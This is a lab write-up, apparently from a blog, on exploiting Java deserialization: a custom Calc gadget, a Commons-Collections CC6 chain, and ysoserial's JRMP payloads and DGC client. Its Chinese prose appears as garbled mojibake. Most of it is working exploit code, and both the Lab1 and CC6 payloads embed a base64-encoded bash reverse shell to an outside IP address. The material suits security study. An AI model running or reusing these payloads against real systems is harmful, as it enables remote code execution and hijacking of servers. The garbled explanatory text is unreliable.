<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicclass Calcimplements Serializable &#123;</span><br><span class="line">privateboolean canPopCalc =<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String cmd = <span class="string">&quot;ls -al&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">privatevoid <span class="title">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    objectInputStream.defaultReadObject();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.canPopCalc)</span><br><span class="line">      Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç›´æ¥æ¥æ„é€ exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.Calc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeriaCalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFiled</span><span class="params">(Object obj,String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Calc calc = <span class="keyword">new</span> Calc();</span><br><span class="line">				setFiled(calc, <span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvNTYxNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">				setFiled(calc, <span class="string">&quot;canPopCalc&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        System.out.println(Utils.objectToHexString(calc));</span><br><span class="line"><span class="comment">//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream out = null;</span></span><br><span class="line"><span class="comment">//        out = new ObjectOutputStream(byteArrayOutputStream);</span></span><br><span class="line"><span class="comment">//        out.writeObject(calc);</span></span><br><span class="line"><span class="comment">//        out.flush();</span></span><br><span class="line"><span class="comment">//        byte[] bytes = byteArrayOutputStream.toByteArray();</span></span><br><span class="line"><span class="comment">//        byteArrayOutputStream.close();</span></span><br><span class="line"><span class="comment">//        System.out.println(Utils.bytesTohexString(bytes));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line"><span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(bytes));</span></span><br><span class="line"><span class="comment">//        Calc c = (Calc) objectInputStream.readObject();</span></span><br><span class="line">        String data = <span class="string">&quot;aced0005737200096c6162312e43616c63aebcd66698cce75a0200025a000a63616e506f7043616c634c0003636d647400124c6a6176612f6c616e672f537472696e673b78700174000b636d64202f632063616c63&quot;</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š</p>
<p>è™½ç„¶å¯èƒ½åªæœ‰æˆ‘è‡ªå·±ä¼šçŠ¯è¿™ç§é”™ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°tipï¼ŒCalcçš„è·¯å¾„ä¹Ÿå°±æ˜¯packageå¿…é¡»å’Œé¢˜ç›®ç»™çš„æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ˜¯æ ¹æ®åŒ…å»æ‰¾ç›¸åº”çš„ç±»çš„ï¼Œæ‰€æœ‰è¯¥è½¯ä»¶åŒ…ä¸å­˜åœ¨å°±ä¼šå¯¼è‡´æ‰¾ä¸åˆ°ç›¸åº”çš„ç±»</p>
<p><img src="https://img-blog.csdnimg.cn/3642f38af44c4eb799815ee4fef04bb9.png" alt="Untitled"></p>
<p>ç»“æœï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/f1c1f129d65c4bca8240d559e1b3639a.png" alt="Untitled"></p>
<h2 id="Lab2-Ysoserial"><a href="#Lab2-Ysoserial" class="headerlink" title="Lab2-Ysoserial"></a>Lab2-Ysoserial</h2><p><img src="https://img-blog.csdnimg.cn/8eccf8603ceb45ceb63101375c1c63bc.png" alt="Untitled"></p>
<p>å­˜åœ¨Commons-Collections-3.2.1ä¾èµ–</p>
<p>ååºåˆ—åŒ–é‡Œå­˜åœ¨ä¸€å®šæ¡ä»¶<code>name.equals(&quot;SJTU&quot;) &amp;&amp; year == 1896</code> ï¼Œæ‰€ä»¥å¯¼è‡´ä¸èƒ½ç›´æ¥åˆ©ç”¨å·¥å…·ç”Ÿæˆpayloadï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line">publicclass IndexController &#123;</span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/basic&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required =true)</span> String data, Model model)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">    InputStream inputStream =<span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">    ObjectInputStream objectInputStream =<span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">    String name = objectInputStream.readUTF();</span><br><span class="line"><span class="keyword">int</span> year = objectInputStream.readInt();</span><br><span class="line"><span class="keyword">if</span> (name.equals(<span class="string">&quot;SJTU&quot;</span>) &amp;&amp; year == <span class="number">1896</span>)</span><br><span class="line">      objectInputStream.readObject();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨é€šç”¨çš„CC6ï¼Œè¿˜æ²¡è¯•è¿‡å…¶ä»–çš„é“¾å­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers1 = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvNTYxNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain, transformers1);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">1896</span>);</span><br><span class="line"></span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»“æœï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/f7326c2d3fda4a40a28c460fad322b1f.png" alt="Untitled"></p>
<h2 id="Lab3-shiro-jrmp"><a href="#Lab3-shiro-jrmp" class="headerlink" title="Lab3-shiro-jrmp"></a>Lab3-shiro-jrmp</h2><h3 id="çŸ¥è¯†ç‚¹-JRMP"><a href="#çŸ¥è¯†ç‚¹-JRMP" class="headerlink" title="çŸ¥è¯†ç‚¹ - JRMP"></a>çŸ¥è¯†ç‚¹ - JRMP</h3><p>JRMPåè®®(Java Remote Message Protocol)ï¼šRMIä¸“ç”¨çš„Javaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ã€‚</p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/14934168.html">Java JRMP - zpchcbd - åšå®¢å›­ (cnblogs.com)</a></p>
<p><img src="https://img-blog.csdnimg.cn/e030d04a4eaf4aa6b3684037467e7115.png" alt="Untitled"></p>
<p>å…‰çœ‹ç€ï¼Œæœ‰ç‚¹ä¸èƒ½å…¨éƒ¨ç†è§£ã€‚ç›´æ¥çœ‹ysoé‡Œé¢çš„payloadå§</p>
<h3 id="Payload-JRMPListener"><a href="#Payload-JRMPListener" class="headerlink" title="Payload/JRMPListener"></a>Payload/JRMPListener</h3><p><code>JRMPListener</code> ç«¯å£ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰,å› ä¸º<code>UnicastRemoteObject</code> çš„æ„é€ æ–¹æ³•éƒ½æ˜¯protectedä¿®é¥°çš„ï¼Œæ‰€ä»¥è¦åˆ©ç”¨åå°„è¿›è¡Œå®ä¾‹åŒ–å¹¶å°†å±æ€§portçš„å€¼è®¾ä¸ºæˆ‘ä»¬å†™å…¥çš„ç«¯å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPListener</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRemoteObject</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRemoteObject <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> jrmpPort = Integer.parseInt(command);</span><br><span class="line">        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            RemoteRef.class</span><br><span class="line">        &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="keyword">new</span> UnicastServerRef(jrmpPort)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Reflections.getField(UnicastRemoteObject.class, <span class="string">&quot;port&quot;</span>).set(uro, jrmpPort);</span><br><span class="line">        <span class="keyword">return</span> uro;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(JRMPListener.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰§è¡Œ<code>PayloadRunner.run(JRMPListener.class, args);</code> ä¹‹åå‘ç°åœ¨ååºåˆ—åŒ–ä¹‹åä¼šä¸€ç›´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå¯ä»¥è°ƒè¯•è·Ÿä¸€ä¸‹</p>
<p>å› ä¸ºæ˜¯å¯¹<code>UnicastRemoteObject</code>ç±»è¿›è¡Œåºåˆ—åŒ–ï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè°ƒç”¨åˆ°<code>UnicastRemoteObject#readObject</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    reexport();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­è·Ÿè¿›åˆ°<code>reexport</code> &gt;&gt; <code>exportObject(Remote obj, int port)</code> &gt;&gt; *<code>exportObject*(obj, new UnicastServerRef(port))</code> ï¼Œå…¶ä¸­portä¸ºæˆ‘ä»¬è®¾ç½®çš„ç«¯å£</p>
<p>è€Œåœ¨å®ä¾‹åŒ–<code>UnicastServerRef</code> ç±»çš„æ—¶å€™ä¼šå°†å¼€æœåŠ¡çš„hostå’Œportä¼ ç»™LiveRefå¹¶ç”Ÿæˆå¯¹è±¡çš„å”¯ä¸€æ ‡è¯†ç¬¦</p>
<p>åœ¨ä¹‹åè®¾ç½®objçš„refä¸ºsrefï¼Œå…¶ä¸­åŒ…æ‹¬äº†LiveRefè¿™ä¸ªç±»çš„ä¿¡æ¯</p>
<p><img src="https://img-blog.csdnimg.cn/65c6c3f15323423782b4bf9c2ded7ef8.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå†è·Ÿåˆ°äº†<code>UnicastServerRef#exportObject</code> ï¼Œä¹‹åå…¶å®å°±æ˜¯èµ°äº†ä¸€éé€šè¿‡åå°„å»å®ä¾‹åŒ–<code>UnicastRemoteObject</code>  å¹¶è®¾ç½®<code>Skeleton</code> å’Œ<code>stub</code> ï¼Œåœ¨åç»­è·Ÿè¿›åˆ°LiveRefçš„listenåˆ›å»ºServerSocketï¼Œä»è€Œå¼€å¯rmiæœåŠ¡</p>
<p><img src="https://img-blog.csdnimg.cn/d9373ca2169842b69da7a6c61f7ad45e.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/573e06d0351c440eb43a65d0310a922d.png" alt="Untitled"></p>
<h3 id="Exp-JRMPClient"><a href="#Exp-JRMPClient" class="headerlink" title="Exp/JRMPClient"></a>Exp/JRMPClient</h3><blockquote>
<ul>
<li>targeting the remote DGC (Distributed Garbage Collection, always there if there is a listener)</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>not deserializing anything (so you donâ€™t get yourself exploited ;))</li>
</ul>
</blockquote>
<p>è¿™ä¸ªæ”»å‡»æ–¹å¼çš„ç›®æ ‡æ˜¯è¿œç¨‹çš„DGC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( args.length &lt; <span class="number">4</span> ) &#123;</span><br><span class="line">            System.err.println(JRMPClient.class.getName() + <span class="string">&quot; &lt;host&gt; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object payloadObject = Utils.makePayloadObject(args[<span class="number">2</span>], args[<span class="number">3</span>]);</span><br><span class="line">        String hostname = args[ <span class="number">0</span> ];</span><br><span class="line">        <span class="keyword">int</span> port = Integer.parseInt(args[ <span class="number">1</span> ]);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.err.println(String.format(<span class="string">&quot;* Opening JRMP socket %s:%d&quot;</span>, hostname, port));</span><br><span class="line">            makeDGCCall(hostname, port, payloadObject);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        Utils.releasePayload(args[<span class="number">2</span>], payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çš„åˆ©ç”¨æ–¹æ³•æ˜¯ï¼š</p>
<p>ä¼ å…¥çš„å‚æ•°ä¸ºå¼€å¯RMIæœåŠ¡çš„hostå’Œportä»¥åŠæˆ‘ä»¬ç”¨äºæ”»å‡»çš„Gadgetï¼Œä¼šå…ˆå¯¹è¯¥æœåŠ¡è¿›è¡Œè¿æ¥ï¼Œç„¶åå°†Gadgetåºåˆ—åŒ–ä¼ åˆ°è¿œç¨‹çš„RMIæœåŠ¡ï¼Œå› ä¸ºåœ¨å‰é¢<a href="https://ameuu.github.io/2022/04/13/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A2/">Javaå­¦ä¹ ç¬”è®°â…¢</a>ä¸­æœ‰è®²åˆ°è¿‡ï¼ŒRMIæœåŠ¡ä¹‹é—´ä¼ è¾“æ•°æ®çš„æ—¶å€™éƒ½æ˜¯ä»¥åºåˆ—åŒ–æ•°æ®æµä¼ è¾“çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åºåˆ—åŒ–ä¹‹åçš„Gadgetè¢«ä¼ è¿›å»çš„æ—¶å€™ï¼Œä¼šè¢«è¿œç¨‹æœåŠ¡ååºåˆ—åŒ–ä»è€Œäº§ç”ŸRCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeDGCCall</span> <span class="params">( String hostname, <span class="keyword">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException </span>&#123;</span><br><span class="line">    InetSocketAddress isa = <span class="keyword">new</span> InetSocketAddress(hostname, port);</span><br><span class="line">    Socket s = <span class="keyword">null</span>;</span><br><span class="line">    DataOutputStream dos = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">        s.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">        s.setTcpNoDelay(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        OutputStream os = s.getOutputStream();</span><br><span class="line">        dos = <span class="keyword">new</span> DataOutputStream(os);</span><br><span class="line"></span><br><span class="line">        dos.writeInt(TransportConstants.Magic);</span><br><span class="line">        dos.writeShort(TransportConstants.Version);</span><br><span class="line">        dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line"></span><br><span class="line">        dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">        <span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;resource&quot;</span> )</span><br><span class="line">        <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> MarshalOutputStream(dos);</span><br><span class="line"></span><br><span class="line">        objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">        objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">        objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">        objOut.writeShort(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">        objOut.writeLong(-<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        objOut.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">        os.flush();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dos != <span class="keyword">null</span> ) &#123;</span><br><span class="line">            dos.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( s != <span class="keyword">null</span> ) &#123;</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Exp-JRMPListener"><a href="#Exp-JRMPListener" class="headerlink" title="Exp/JRMPListener"></a>Exp/JRMPListener</h3><h3 id="Payload-JRMPClient"><a href="#Payload-JRMPClient" class="headerlink" title="Payload/JRMPClient"></a>Payload/JRMPClient</h3><p><code>ObjID</code>  ç”¨äºç”Ÿæˆç±»çš„å”¯ä¸€æ ‡è¯†ï¼Œ<code>TCPEndpoint</code>  åˆ™ç”¨æ¥è®°å½•è¿œç¨‹æœåŠ¡ä»¥ä¾¿è¿æ¥ï¼Œæœ‰äº›ä¸èƒ½ç†è§£çš„å°±æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨åŠ¨æ€ä»£ç†æ¥å®ç°<code>Registry</code> ç„¶åå†è¿›è¡Œååºåˆ—åŒ–ï¼Œå› ä¸ºååºåˆ—åŒ–çš„æ—¶å€™å¥½åƒè€¶å¹¶æ²¡æœ‰ç”¨åˆ°<code>Regstry</code> ï¼ˆæ„Ÿè§‰å¯èƒ½è¿™æ˜¯RMIçš„çŸ¥è¯†ï¼Ÿ</p>
<p>é¢â€¦â€¦ï¼ŒæŠŠpayloadç›´æ¥æ¢æˆåºåˆ—åŒ–<code>RemoteObjectInvocationHandler</code> ä¹Ÿæ‰§è¡ŒæˆåŠŸäº†</p>
<p>Gadgetï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RemoteObjectInvocationHandler#readObject</span><br><span class="line">	UnicastRef#readExternal</span><br><span class="line">		LiveRef#read</span><br><span class="line">			DGCClient#registerRefs</span><br><span class="line">				DGCClient#registerRefs(List&lt;LiveRef&gt; var1)</span><br><span class="line">						DGCClient#makeDirtyCall</span><br><span class="line">							DGCImpl_Stub#dirty</span><br><span class="line">									UnicastRef#newCall</span><br><span class="line">										UnicastRef#invoke</span><br><span class="line">												StreamRemoteCall#executeCall#<span class="keyword">this</span>.in.readObject()</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦ä»£ç å—ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line">    <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">    RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Registry.class</span><br><span class="line">    &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨vpsåˆ©ç”¨ysoå¼€å¯JRMPç›‘å¬ï¼Œåˆ©ç”¨CC6çš„é“¾å­ï¼Œå‘½ä»¤ä¸º<code>calc</code></p>
<p><a href="https://xz.aliyun.com/t/2650#toc-5">ysoserial JRMPç›¸å…³æ¨¡å—åˆ†æï¼ˆäºŒï¼‰- payloads/JRMPClient &amp; exploit/JRMPListener - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>å¼€å§‹è°ƒè¯•</p>
